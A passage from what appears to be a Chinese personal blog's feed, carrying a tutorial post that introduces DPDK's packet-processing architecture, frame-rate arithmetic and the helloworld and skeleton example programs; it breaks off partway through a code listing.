        &lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h4&gt;&lt;p&gt;研三上学期我的时间几乎每天被分成了几大块。睡觉吃饭、健身、读书、毕设、吉他，目的是让学生时代最后过的有意义些。健身时间我基本上固定到了每天中
      
    
    </summary>
    
    
      <category term="随笔" scheme="elssm.github.io/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>DPDK初探</title>
    <link href="elssm.github.io/2022/10/10/DPDK%E5%88%9D%E6%8E%A2/"/>
    <id>elssm.github.io/2022/10/10/DPDK初探/</id>
    <published>2022-10-10T02:36:17.000Z</published>
    <updated>2022-10-10T02:58:22.796Z</updated>
    
    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>什么是DPDK？对于用户，是性能出色的报数据处理加速软件库；对于开发者，是一个实践包处理新想法的创新工场；对于性能调优者，是一个绝佳的成果分享平台。DPDK对于当下火热的网络功能虚拟化而言是一个重要基石。</p><p>DPDK最初的动机很简单，就是证明IA多核处理器能够支撑高性能数据包处理。随着早期目标的达成和更多通用处理器体系的加入，DPDK逐渐成为通用多核处理器高性能数据包处理的业界标杆。</p><h4 id="主流包处理硬件平台"><a href="#主流包处理硬件平台" class="headerlink" title="主流包处理硬件平台"></a>主流包处理硬件平台</h4><p>支持包处理的主流硬件平台大致分为三个方向。</p><ul><li>硬件加速器：对于本身模块化的固化功能具有高性能低成本的特点</li><li>网络处理器：提供了包处理逻辑软件可编程的能力</li><li>多核处理器：在更为复杂多变的高层包处理上有优势</li></ul><h5 id="硬件加速器"><a href="#硬件加速器" class="headerlink" title="硬件加速器"></a>硬件加速器</h5><p>硬件加速器被广泛用于包处理领域，ASIC和FPGA是其最广为采用的器件。</p><p>ASIC：一种应特定用户要求和特定电子系统的需要而设计、制造的集成电路。ASIC的优点是面向特定用户的需求，在批量生产时与通用集成电路相比体积更小、功耗更低、可靠性更高、性能提高、保密性增强、成本降低等。但ASIC的缺点也很明显，它的灵活性和扩展性不够、开发费用高、开发周期长。</p><p>FPGA：现场可编程门阵列。作为ASIC领域中的一种半定制电路而出现，与ASIC的区别是用户不需要介入芯片的布局布线和工艺问题，而且可以随时改变其逻辑功能，使用灵活。FPGA以并行运算为主，开发相对于传统PC、单片机开发有很大不同。以硬件描述语言(Verilog或VHDL)来实现。</p><p>全可编程FPGA概念的提出，使FPGA朝着进一步软化的方向持续发展，其并行化整数运算的能力将进一步在通用计算定制化领域得到挖掘，近年来在数据中心中起的了很大进步，例如应用于机器学习场合。</p><h5 id="网络处理器"><a href="#网络处理器" class="headerlink" title="网络处理器"></a>网络处理器</h5><p>网络处理器是专门为处理数据包而设计的可编程通用处理器，采用多内核并行处理结构，其常被应用于通信领域的各种任务，比如包处理、协议分析、路由查找、声音/数据的汇聚、防火墙、QoS等。其通用性表现在执行逻辑由运行时加载的软件决定，用户使用专用指令集即微码(microcode)进行开发。其硬件体系结构大多采用高速的接口技术和总线规范，具有较高的I/O能力，使得包处理能力得到很大提升。</p><p>如下图是NP-5处理器架构框图，其中TOP部分是可编程部分，根据需要通过编写微码实现业务相关的包处理逻辑。NPU拥有高性能和高可编程性等优点。但其成本和特定领域的特性限制了它的市场规模。而不同厂商不同架构的NPU遵循的微码规范不尽相同，开发人员的成长以及生态系统的构建都比较困难。虽然一些NPU的微码也开始支持由高级语言(例如C)编译生成，但由于结构化语言本身原语并未面向包处理，使得转换后的效率并不理想。</p><p><img src="/2022/10/10/DPDK初探/1.png" alt="1"></p><h5 id="多核处理器"><a href="#多核处理器" class="headerlink" title="多核处理器"></a>多核处理器</h5><p>现代CPU性能的扩展主要通过多核的方式进行演进。这样利用通用处理器同样可以在一定程度上并行地处理网络负载。下图是Intel双路服务器平台框图，描述了一个典型的双路服务器平台的多个模块，CPU、芯片组C612、内存和以太网控制器XL710构成了主要的数据处理通道。基于PCIe总线的I/O接口提供了大量的系统接口，为服务器平台引入了差异化的设计。</p><p><img src="/2022/10/10/DPDK初探/2.png" alt="2"></p><p>当前的多核处理器也正在走向SoC化，针对网络的SoC往往集成内存控制器、网络控制器，甚至是一些硬件加速处理引擎。以下是一些主流厂商的多核处理器的SoC平台</p><ul><li>IA multi-core Xeon</li><li>Tilear-TILE-Gx</li><li>Cavium Network-OCTEON &amp; OCTEON II</li><li>Freescale-QorIQ</li><li>NetLogic Microsystem-XLP</li></ul><h4 id="初识DPDK"><a href="#初识DPDK" class="headerlink" title="初识DPDK"></a>初识DPDK</h4><p>以Linux为例，传统网络设备驱动包处理的动作可以概括如下：</p><ul><li>数据包到达网卡设备</li><li>网卡设备依据配置进行DMA操作</li><li>网卡发送中断，唤醒处理器</li><li>驱动软件填充读写缓冲区数据结构</li><li>数据报文到达内核协议栈，进行高层处理</li><li>如果最终应用在用户态，数据从内核搬移到用户态</li><li>如果最终应用在内核态，在内核继续进行</li></ul><p>随着网络接口带宽从千兆向万兆迈进，原先每个报文就会触发一个中断，中断带来的开销变得突出。大量数据到来会触发频繁的中断开销，导致系统无法承受，因此有人在Linux内核中引入了<code>NAPI</code>机制，其策略是系统被中断唤醒后，尽量使用轮询的方式一次处理多个数据包，直到网络再次空闲重新转入中断等待。</p><p>一个二层以太网包经过网络设备驱动的处理后，最终大多要交给用户态的应用。网络包进入计算机大多需要经过协议处理，在Linux系统中TCP/IP由Linux内核处理。即使在不需要协议处理的场景下，大多数场景也需要把包从内核的缓冲区复制到用户缓冲区，系统调用以及数据包复制的开销，会直接影响用户态应用从设备直接获得包的能力，而对于多样的网络功能节点来说，TCP/IP协议栈并不是数据转发节点所必需的。</p><p>如果再往使实时性方面考虑，传统上，事件从中断发生到应用感知，也是要经过长长的软件处理路径，所以在2010年前采用IA(Intel Architecture)处理器的用户会得出一个结论，就是IA不适合做包处理。</p><h4 id="DPDK最佳实践"><a href="#DPDK最佳实践" class="headerlink" title="DPDK最佳实践"></a>DPDK最佳实践</h4><p>现在，DPDK的出现很好的解答了IA多核处理器是否可以应对高性能数据包处理这一问题。</p><p>DPDK技术大致归纳如下：</p><ul><li>轮询：避免中断上下文切换的开销。</li><li>用户态驱动：既规避了不必要的内存拷贝又避免了系统调用。</li><li>亲和性与独占：DPDK虽然工作在用户态，但是线程的调度仍然依赖内核。利用线程的CPU亲和绑定的方式，特定任务可以被指定在某个核上工作。好处是可避免线程在不同核间频繁切换，核间线程切换容易导致因<code>cache miss</code>和<code>cache write back</code>造成的大量性能损失。</li><li>降低访存开销：利用内存大页能有效降低<code>TLB miss</code>，利用内存多通道的交错访问有效提高内存访问的有效带宽，利用对于内存非对称性的感知避免额外的访存延迟。</li><li>软件调优：结构的<code>cache line</code>对齐、数据在多核间访问避免跨<code>cache line</code>共享、适时地预取数据、多元数据批量操作等</li><li>利用IA新硬件技术：拿<code>Intel DDIO</code>技术来讲，这个cache子系统对DMA访存的硬件创新直接助推了性能跨越式的增长。有效利用SIMD（<code>Single Instruction Multiple Data</code>）并结合超标量技术（<code>Superscalar</code>）对数据层面或者对指令层面进行深度并行化，在性能的进一步提升上也行之有效。另外一些指令（比如<code>cmpxchg</code>），本身就是<code>lockless</code>数据结构的基石，而<code>crc32</code>指令对于<code>4 Byte Key</code>的哈希计算也是改善明显。</li><li>充分挖掘网卡的潜能：经过<code>DPDK I/O</code>加速的数据包通过<code>PCIe</code>网卡进入系统内存，<code>PCIe</code>外设到系统内存之间的带宽利用效率、数据传送方式（<code>coalesce</code>操作）等都是直接影响I/O性能的因素。在现代网卡中，往往还支持一些分流（如RSS，FDIR等）和卸载（如Chksum， TSO等）功能。DPDK充分利用这些硬件加速特性，帮助应用更好地获得直接的性能提升。</li></ul><h4 id="DPDK框架简介"><a href="#DPDK框架简介" class="headerlink" title="DPDK框架简介"></a>DPDK框架简介</h4><p>DPDK为IA上的高速包处理而设计。大量利用了有助于包处理的软硬件特性，如大页、缓存行对齐、线程绑定、预取、NUMA、IA最新指令的利用、Intel DDIO、内存交叉访问等。</p><ul><li><p>核心库 Core Libs，提供系统抽象、大页内存、缓存池、定时器及无锁环等基础组件。 </p></li><li><p>PMD 库，提供全用户态的驱动，以便通过轮询和线程绑定得到极高的网络吞吐，支持 各种本地和虚拟的网卡。</p></li><li><p>Classify 库，支持精确匹配（Exact Match）、最长匹配（LPM）和通配符匹配（ACL），提 供常用包处理的查表操作。 </p></li><li><p>QoS 库，提供网络服务质量相关组件，如限速（Meter）和调度（Sched）。</p></li></ul><p>下图为DPDK主要模块分解</p><p><img src="/2022/10/10/DPDK初探/3.png" alt="3"></p><p>除了这些组件，DPDK还提供了几个平台特性，比如节能考虑的运行时频率调整(POWER)、与Linux Kernel stack建立快速通道的KNI(Kernel Network Interface)。而Packet Framework和DISTRIB为搭建更复杂的多核流水线处理模型提供了基础的组件。</p><h4 id="解读数据包处理能力"><a href="#解读数据包处理能力" class="headerlink" title="解读数据包处理能力"></a>解读数据包处理能力</h4><p>以以太网为例，一般所说的接口带宽，1Gbit/s、10Gbit/s、25Gbit/s、40Gbit/s、 100Gbit/s，代表以太接口线路上所能承载的最高传输比特率，其单位是 bit/s（bit per second， 位 / 秒）。实际上，不可能每个比特都传输有效数据。以太网每个帧之间会有帧间距（InterPacket Gap，IPG），默认帧间距大小为12字节。每个帧还有7个字节的前导（Preamble），和1个字节的帧首定界符（Start Frame Delimiter，SFD）。具体帧格式如下图所示，有效内容主要是以太网的目的地址、源地址、以太网类型、负载。报文尾部是校验码。</p><p><img src="/2022/10/10/DPDK初探/4.png" alt="4"></p><p>通常意义上的满速带宽能跑有效数据的吞吐可以由如下公式得到理论帧转发率：</p><p>帧转发率 = BitRate/8 / IPG+Preamble+SFD+PKtSize</p><p>而这个最大理论帧转发率的倒数表示了线速情况下先后两个包到达的时间间隔</p><p>按照这个公式，将不同包长按照特定的速率计算可得到一个以太帧转发率，如下图所示，可以发现在相同带宽速率下，包长越小的包，转发率越高，帧间延迟也越小。</p><p><img src="/2022/10/10/DPDK初探/5.png" alt="5"></p><h4 id="软件包处理的潜力"><a href="#软件包处理的潜力" class="headerlink" title="软件包处理的潜力"></a>软件包处理的潜力</h4><h5 id="DPDK加速网络节点"><a href="#DPDK加速网络节点" class="headerlink" title="DPDK加速网络节点"></a>DPDK加速网络节点</h5><p>DPDK软件包内有一个最基本的三层转发实例(l3fwd)，可用于测试双路服务器整个系统的吞吐能力，实验表明可以达到 220Gbit/s 的数据报文吞吐能力。值得注意的是，除了通过 硬件或者软件提升性能之外，如今 DPDK 整系统报文吞吐能力上限已经不再受限于 CPU 的 核数，当前瓶颈在于 PCIe（IO 总线）的 LANE 数。换句话说，系统性能的整体 I/O 天花板不 再是 CPU，而是系统所提供的所有 PCIe LANE 的带宽，能插入多少个高速以太网接口卡。</p><p>在这样的性能基础上，网络节点的软化就成为可能。对于网络节点上运转的不同形态的网络功能，一旦软化并适配到一个通用的硬件平台，随之一个自然的诉求可能就是软硬件解耦。解耦正是网络功能虚拟化（NFV）的一个核心思想，而硬件解耦的多个网络功能在单一通用节点上的隔离共生问题，是另一个核心思想虚拟化诠释的。当然这个虚拟化是广义的， 在不同层面可以有不同的支撑技术。</p><p>NFV有很多诉求，业务面高性能，控制面高可用、高可靠、易运维、易管理等。但没有业务面的高性能，后续的便无从谈起。DPDK始终为高性能业务面提供坚实的支撑，除此以外，DPDK立足IA的CPU 虚拟化技术和IO的虚拟化技术，对各种通道做持续优化改进的同时，也对虚拟交换（vswitch）的转发面进化做出积极贡献。应对绝对高吞吐能力的要求，DPDK支持各种I/O的SR-IOV接口；应对高性能虚拟主机网络的要求，DPDK支持标准virtio接口；对虚拟化平台的支撑，DPDK从KVM、VMWARE、XEN的hypervisor到容器技术，可谓全平台覆盖。</p><h5 id="DPDK加速计算节点"><a href="#DPDK加速计算节点" class="headerlink" title="DPDK加速计算节点"></a>DPDK加速计算节点</h5><p>C10K是IT界的一个著名命题，甚至后续衍生出了关于C1M和C10M的讨论。其阐述 的一个核心问题就是，随着互联网发展，随着数据中心接口带宽不断提升，计算节点上各种互联网服务对于高并发下的高吞吐有着越来越高的要求。 </p><p>但是单一接口带宽的提高并不能直接导致高并发、高吞吐服务的发生，即使用到了一系列系统方法（异步非阻塞，线程等），但网络服务受限于内核协议栈多核水平扩展上的不足以及建立拆除连接的高开销，开始逐渐阻碍进一步高并发下高带宽的要求。另一方面，内核协议栈需要考虑更广泛的支持，并不能为特定的应用做特殊优化，一般只能使用系统参数进行调优。 当然，内核协议栈也在不断改进，而以应用为中心的趋势也会不断推动用户态协议栈的涌现。有基于BSD协议栈移植的，有基于多核模型重写的原型设计，也有将整个Linux内核包装成库的。它们大多支持以DPDK作为I/O引擎，有些也将DPDK的一些优化想法加入到协议栈的优化中，取得了比较好的效果。</p><h5 id="DPDK加速存储节点"><a href="#DPDK加速存储节点" class="headerlink" title="DPDK加速存储节点"></a>DPDK加速存储节点</h5><p>Intel最近开源了SPDK（Storage Performance Development Kit），一款存储加速开发套件，其主要的应用场景是iSCSI性能加速。目前iSCSI系统包括前端和后端两个部分，在前端，DPDK提供网络I/O加速，加上一套用户态TCP/IP协议栈（目前还不包含在开源包中），以流水线的工作方式支撑起基于iSCSI的应用；在后端，将DPDK用户态轮询驱动的方式实践在NVMe上，PMD的NVMe驱动加速了后端存储访问。这样一个端到端的整体方案，用数据证明了卓有成效的IOPS性能提升。</p><h5 id="DPDK方法论"><a href="#DPDK方法论" class="headerlink" title="DPDK方法论"></a>DPDK方法论</h5><ul><li>专用负载下的针对性软件优化</li><li>追求可水平扩展的性能</li><li>向Cache索求极致的实现优化性能</li></ul><h4 id="DPDK安装"><a href="#DPDK安装" class="headerlink" title="DPDK安装"></a>DPDK安装</h4><p>Todo</p><h4 id="DPDK实例"><a href="#DPDK实例" class="headerlink" title="DPDK实例"></a>DPDK实例</h4><p>在对DPDK的原理和代码展开进一步解析之前，先看一些小而简单的例子，建立一个形象上的认知。</p><ul><li>helloworld：启动基础运行环境，DPDK构建了一个基于操作系统的，但适合包处理的软件运行环境，你可以认为这是个mini-OS</li><li>skeleton：最精简的单核报文收发骨架</li><li>l3fwd：三层转发是DPDK用于发布性能测试指标的主要应用</li></ul><h5 id="Helloworld"><a href="#Helloworld" class="headerlink" title="Helloworld"></a>Helloworld</h5><p>DPDK里的helloworld是最基础的入门程序。它建立了一个多核运行的基础环境，每个线程会打印<code>hello from core #</code>，其中<code>core #</code>是由操作系统管理的。</p><p>代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* SPDX-License-Identifier: BSD-3-Clause</span></span><br><span class="line"><span class="comment"> * Copyright(c) 2010-2014 Intel Corporation</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/queue.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;rte_memory.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;rte_launch.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;rte_eal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;rte_per_lcore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;rte_lcore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;rte_debug.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Launch a function on lcore. 8&lt; */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">lcore_hello(__rte_unused <span class="keyword">void</span> *arg)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">unsigned</span> lcore_id;</span><br><span class="line">lcore_id = rte_lcore_id();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"hello from core %u\n"</span>, lcore_id);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &gt;8 End of launching function on lcore. */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Initialization of Environment Abstraction Layer (EAL). 8&lt; */</span></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">main(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"><span class="keyword">unsigned</span> lcore_id;</span><br><span class="line"></span><br><span class="line">ret = rte_eal_init(argc, argv);</span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">rte_panic(<span class="string">"Cannot init EAL\n"</span>);</span><br><span class="line"><span class="comment">/* &gt;8 End of initialization of Environment Abstraction Layer */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Launches the function on each lcore. 8&lt; */</span></span><br><span class="line">RTE_LCORE_FOREACH_WORKER(lcore_id) &#123;</span><br><span class="line"><span class="comment">/* Simpler equivalent. 8&lt; */</span></span><br><span class="line">rte_eal_remote_launch(lcore_hello, <span class="literal">NULL</span>, lcore_id);</span><br><span class="line"><span class="comment">/* &gt;8 End of simpler equivalent. */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* call it on main lcore too */</span></span><br><span class="line">lcore_hello(<span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">/* &gt;8 End of launching the function on each lcore. */</span></span><br><span class="line"></span><br><span class="line">rte_eal_mp_wait_lcore();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* clean up the EAL */</span></span><br><span class="line">rte_eal_cleanup();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从代码角度，<code>rte</code>是指<code>runtime environment</code>，<code>eal</code>是指<code>environment abstraction layer</code>。DPDK的主要对外函数接口都是以<code>rte_</code>作为前缀，抽象化函数接口可以帮助DPDK运行在多个操作系统上。</p><h6 id="初始化基础运行环境"><a href="#初始化基础运行环境" class="headerlink" title="初始化基础运行环境"></a>初始化基础运行环境</h6><p>主线程运行入口是<code>main</code>函数，调用了<code>rte_eal_init</code>入口函数，启动基础运行环境。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">rte_eal_init</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> **argv)</span></span></span><br></pre></td></tr></table></figure><p>入口参数是启动DPDK的命令行，可以是长长的一串很复杂的设置。对于Helloworld这个实例，最需要的参数是”-c <core mask>“ ，线程掩码(core mask)指定了需要参与运行的线程集合。<code>rte_eal_init</code>本身完成的工作很复杂，它读取入口参数，解析并保存作为DPDK运行的系统信息，依赖这些信息，构建一个针对包处理设计的运行环境，主要动作分解如下：</core></p><ul><li>配置初始化</li><li>内存初始化</li><li>内存池初始化</li><li>队列初始化</li><li>告警初始化</li><li>中断初始化</li><li>PCI初始化</li><li>定时器初始化</li><li>检测内存本地化(NUMA)</li><li>插件初始化</li><li>主线程初始化</li><li>轮询设备初始化</li><li>建立主从线程通道</li><li>将从线程设置在等待模式</li><li>PCI设备的探测与初始化</li></ul><h6 id="多核运行初始化"><a href="#多核运行初始化" class="headerlink" title="多核运行初始化"></a>多核运行初始化</h6><p>DPDK面向多核设计，程序会试图独占运行在逻辑核(lcore)上。<code>main</code>函数里重要的是启动多核运行环境。<code>RTE_LCORE_FOREACH_WORKER(lcore_id)</code>，遍历所有EAL指定可以使用的lcore，然后通过<code>rte_eal_remote_launch</code>在每个lcore上，启动被指定的线程。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">rte_eal_remote_launch</span><span class="params">(<span class="keyword">int</span> (*f)(<span class="keyword">void</span> *),<span class="keyword">void</span> *arg,<span class="keyword">unsigned</span> slave_id)</span></span>;</span><br></pre></td></tr></table></figure><p>第一个参数是从线程，是被征召的线程</p><p>第二个参数是传给从线程的参数</p><p>第三个参数是指定的逻辑核，从线程会执行在这个core上</p><p><code>rte_eal_remote_launch(lcore_hello, NULL, lcore_id);</code></p><p>其中，参数lcore_id指定了从线程ID，运行入口函数lcore_hello，运行函数lcore_hello，它读取自己的逻辑核编号(lcore_id)，打印出”hello from core #”</p><h5 id="Skeleton"><a href="#Skeleton" class="headerlink" title="Skeleton"></a>Skeleton</h5><p>skeleton的设计初衷是实现一个最简单的报文收发示例，对收入报文不做任何处理直接发送。可以用于平台的单核报文出入性能测试。</p><p>主要处理函数<code>main</code>处理逻辑如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The main function, which does initialization and calls the per-lcore</span></span><br><span class="line"><span class="comment"> * functions.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">main(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rte_mempool</span> *<span class="title">mbuf_pool</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> nb_ports;</span><br><span class="line"><span class="keyword">uint16_t</span> portid;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Initializion the Environment Abstraction Layer (EAL). 8&lt; */</span></span><br><span class="line"><span class="keyword">int</span> ret = rte_eal_init(argc, argv);</span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">rte_exit(EXIT_FAILURE, <span class="string">"Error with EAL initialization\n"</span>);</span><br><span class="line"><span class="comment">/* &gt;8 End of initialization the Environment Abstraction Layer (EAL). */</span></span><br><span class="line"></span><br><span class="line">argc -= ret;</span><br><span class="line">argv += ret;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Check that there is an even number of ports to send/receive on. */</span></span><br><span class="line">nb_ports = rte_eth_dev_count_avail();</span><br><span class="line"><span class="keyword">if</span> (nb_ports &lt; <span class="number">2</span> || (nb_ports &amp; <span class="number">1</span>))</span><br><span class="line">rte_exit(EXIT_FAILURE, <span class="string">"Error: number of ports must be even\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Creates a new mempool in memory to hold the mbufs. */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Allocates mempool to hold the mbufs. 8&lt; */</span></span><br><span class="line">mbuf_pool = rte_pktmbuf_pool_create(<span class="string">"MBUF_POOL"</span>, NUM_MBUFS * nb_ports,</span><br><span class="line">MBUF_CACHE_SIZE, <span class="number">0</span>, RTE_MBUF_DEFAULT_BUF_SIZE, rte_socket_id());</span><br><span class="line"><span class="comment">/* &gt;8 End of allocating mempool to hold mbuf. */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (mbuf_pool == <span class="literal">NULL</span>)</span><br><span class="line">rte_exit(EXIT_FAILURE, <span class="string">"Cannot create mbuf pool\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Initializing all ports. 8&lt; */</span></span><br><span class="line">RTE_ETH_FOREACH_DEV(portid)</span><br><span class="line"><span class="keyword">if</span> (port_init(portid, mbuf_pool) != <span class="number">0</span>)</span><br><span class="line">rte_exit(EXIT_FAILURE, <span class="string">"Cannot init port %"</span>PRIu16 <span class="string">"\n"</span>,</span><br><span class="line">portid);</span><br><span class="line"><span class="comment">/* &gt;8 End of initializing all ports. */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (rte_lcore_count() &gt; <span class="number">1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\nWARNING: Too many lcores enabled. Only 1 used.\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Call lcore_main on the main core only. Called on single lcore. 8&lt; */</span></span><br><span class="line">lcore_main();</span><br><span class="line"><span class="comment">/* &gt;8 End of called on single lcore. */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* clean up the EAL */</span></span><br><span class="line">rte_eal_cleanup();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先调用<code>rte_eal_init</code>初始化运行环境。检查网络接口数，据此分配内存池<code>rte_pktmbuf_pool_create</code>，入口参数是指定<code>rte_socket_id()</code>，考虑了本地内存使用的范例，调用<code>port_init(portid, mbuf_pool)</code>初始化网口的配置，最后调用<code>lcore_main()</code>进行主处理流程。</p><p>网口初始化流程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">port_init(<span class="keyword">uint8_t</span> port,struct rte_mempool *mbuf_pool)</span><br></pre></td></tr></table></figure><p>首先对指定端口设置队列数，本例指定为单队列。在收发两个方向上，基于端口与队列进行配置设置，缓冲区进行关联设置。</p><p>网口设置：对指定端口设置接收、发送方向的队列数目。依据配置信息来指定端口功能。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">rte_eth_dev_configure</span><span class="params">(<span class="keyword">uint8_t</span> port_id,<span class="keyword">uint16_t</span> nb_rx_q,<span class="keyword">uint16_t</span> nb_tx_q,<span class="keyword">const</span> struct rte_eth_conf *dev_conf)</span></span></span><br></pre></td></tr></table></figure><p>队列初始化：对指定端口的某个队列，指定内存、描述符数量、报文缓冲区、并且对队列进行配置</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">rte_eth_rx_queue_setup</span><span class="params">(<span class="keyword">uint8_t</span> port_id, <span class="keyword">uint16_t</span> rx_queue_id,</span></span></span><br><span class="line"><span class="function"><span class="params"> <span class="keyword">uint16_t</span> nb_rx_desc, <span class="keyword">unsigned</span> <span class="keyword">int</span> socket_id,</span></span></span><br><span class="line"><span class="function"><span class="params"> <span class="keyword">const</span> struct rte_eth_rxconf *rx_conf,</span></span></span><br><span class="line"><span class="function"><span class="params"> struct rte_mempool *mp)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span 